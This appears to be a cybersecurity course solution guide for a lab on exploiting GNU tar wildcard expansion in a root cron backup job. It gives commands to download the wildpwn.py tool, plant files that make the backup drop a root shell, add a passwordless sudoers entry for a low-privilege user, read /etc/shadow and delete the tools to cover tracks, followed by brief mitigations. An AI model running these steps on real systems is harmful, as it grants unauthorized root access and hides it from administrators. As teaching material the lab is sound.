## Solution Guide: Exploiting `tar`

The goal of this activity is to act out the `tar` exploitation and research how to harden systems against this exploit. 

Completing this activity required the following steps: 

- Downloading `wildpwn.py` using a non-`sudo` user account. 
- Running the script to generate `.webscript`.
- Verifying that your user can gain `sudo` access.
- Researching mitigation techniques. 


First, log in as `jane`, and verify that you have no `sudo` rights.
  
   - Run `su jane`. Use `password` as the password.

- Download the [wildpwn.py](https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py) attack tool to your `~/Documents` directory. Do this from the command line, _not_ the browser.
   
   `cd ~/Documents`

   `wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py`


Plant these malicious files in a directory that an administrator is likely to backup. Admins often use a tool called `cron` to take backups automatically.

- `cron` is a service that typically runs with root privileges when used to create automated backups. This means that automated backups that use `tar` with wildcards are vulnerable to the exploit, as you saw earlier in the lecture. 

- Jane's `~/Documents` directory is likely to be included in backups, so you are ready to trigger the automated backup to test the exploit.

- Wait for two minutes. The `cron` job should run with root privileges. It is a common pattern for hackers to plant malware and wait for `cron` to run a command as `root`.

Use `wildpwn.py` to generate the malicious files. Move them to a directory that you expect to be frequently backed up.
  - Run  `python wildpwn.py tar .`
  
    - In this case, we simply leave the files in the `~/Documents/ExploitTar` directory, where they are likely to be backed up.

- The script will be activated in two minutes by `cron`, which is making backups. After waiting two minutes, verify that the backup created a `.cache` directory with a new `.cachefile` that you can use to escalate privileges. 

   - Run:  
      `cd ~/Documents`  
      `   ls -al`  
      `cd .cache`  
      `  ls -al`  
      `    ... .cachefile`

- Run the malware to escalate to `root`. Then, add `jane` to `/etc/sudoers` so that she can run any command with superuser privileges:
  
   - Run:   
         `./.cachefile`  
         `visudo`  
         `# Add the line:`  
         `# jane ALL=(ALL) NOPASSWD:ALL`


- Log back in as `jane` and verify that you can run commands with `sudo`. Then, remove the `.cachefile` and `wildpwn.py` script to cover your tracks.
  
  - Run:  
   `su jane`  
   `sudo cat /etc/shadow`

- Ways to prevent this attack in the future include:

      - Preventing users from downloading files from untrusted sources. This will involve enforcing stricter **permissions** on where users can save files.

      - Using a tool like `tripwire` to watch the file system for suspicious changes. This will alert you whenever a user downloaded files like `wildpwn.py`, or when backups create files like `.cache/.cachefile`.
      
      - Use a tool like `lynis` to scan the system for security vulnerabilities on a regular basis. This will make it more likely that you will identify malicious files before they have a chance to damage the system.

--- 
#### Copyright
Â© 2020 Trilogy Education Services, a 2U, Inc. brand.  All Rights Reserved.